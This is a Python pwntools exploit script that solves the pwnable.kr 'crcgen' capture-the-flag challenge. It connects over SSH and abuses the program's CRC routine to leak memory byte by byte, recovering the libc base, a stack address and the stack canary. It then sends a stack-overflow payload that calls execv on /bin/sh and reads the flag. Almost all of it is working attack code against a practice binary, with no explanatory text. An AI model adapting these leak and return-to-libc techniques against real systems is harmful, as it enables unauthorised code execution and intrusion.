#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 2222 --user crcgen --password guest --path crcgen
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("crcgen")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "pwnable.kr"
port = int(args.PORT or 2222)
user = args.USER or "crcgen"
password = args.PASSWORD or "guest"
remote_path = "crcgen"

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Execute the target binary on the remote host"""
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        # return shell.process([remote_path] + argv, *a, **kw)
        return shell.connect_remote("0.0.0.0", 9031)


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

libc = ELF("./crcgen.so.6")

context.terminal = ["kitty"]
CALCULATE_CRC = 1


def do_crc(io: process, data: bytes, length: int | None = None):
    assert b"\n" not in data

    if length == None:
        length = len(data)

    io.sendlineafter(b"Choice: ", str(CALCULATE_CRC).encode())
    io.sendlineafter(b"What is the length of your data: ", str(length).encode())
    io.sendlineafter(b"Please send me %d bytes to process: " % length, data)

    io.recvuntil(b"CRC is: ")
    return int(io.recvline()[:-1], 16)


def break_crc_backwards(crc_: int, data: bytes):
    for i in range(256):
        if crc.crc_32(p8(i) + data) == crc_:
            return i

    raise Exception("could not break crc")


def break_crc_forwards(crc_: int, data: bytes):
    for i in range(256):
        if crc.crc_32(data + p8(i)) == crc_:
            return i

    raise Exception("could not break crc")


def calc_addr_crc(io: process, addr: int):
    return do_crc(io, b"A" * 256 + p64(addr), length=4)


def read_backwards(io, addr, len_, next_bytes):
    """read len_ bytes from addr, if addr is followed by the given 3 next_bytes"""
    data = bytearray(next_bytes)
    for i in range(len_ - 1, -1, -1):
        crc_ = calc_addr_crc(io, addr + i)
        next_byte = break_crc_backwards(crc_, bytes(data[:3]))

        data.insert(0, next_byte)

    return data[:-3]


def read_forwards(io, addr, len_, prev_bytes):
    """read len_ bytes from addr, if addr is preceeded by the given 3 prev_bytes"""
    data = bytearray(prev_bytes)
    for i in range(len_):
        crc_ = calc_addr_crc(io, addr - 3 + i)
        next_byte = break_crc_forwards(crc_, bytes(data[-3:]))

        data.append(next_byte)

    return data[3:]


def smash_stack(io, data):
    assert b"\n" not in data

    io.sendlineafter(b"Choice: ", str(CALCULATE_CRC).encode())
    io.sendlineafter(b"What is the length of your data: ", data)


EXIT_PTR_GOT_OFFSET = 0x00601FF8


def get_libc_base(io):
    exit_addr = u64(read_backwards(io, EXIT_PTR_GOT_OFFSET, 8, b"\x00" * 3))
    return libc.address + exit_addr - libc.symbols.exit


io = start()

libc.address = get_libc_base(io)

info(f"found libc base 0x{libc.address:x}!")

environ_addr = libc.symbols.environ
environ = u64(read_backwards(io, environ_addr, 8, b"\x00" * 3))


info(f"found environ (stack address) 0x{environ:x}!")

if args.LOCAL:
    canary_offset = 0x110
else:
    canary_offset = 0x108

stack_cookie = u64(read_backwards(io, environ - canary_offset, 0x10, b"\x00" * 3)[:8])

info(f"leaked stack cookie 0x{stack_cookie:x}!")

BIN_SH_STRING_OFFSET = 0x000000000018CE57

payload = b"/bin/sh\x00"  # rdi points to here, rsi already has 0
payload = payload.ljust(0x58, b"A")
payload += p64(stack_cookie)
payload += b"B" * 8  # saved rbp
payload += p64(libc.symbols.execv)  # return address
payload += b"C" * 8  # execve return address
payload += p64(libc.address + BIN_SH_STRING_OFFSET)

smash_stack(io, payload)

io.sendline(b"cat flag")

io.recvuntil(b"(cannot open shared object file): ignored.\n")
io.recvuntil(b"(cannot open shared object file): ignored.\n")

log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
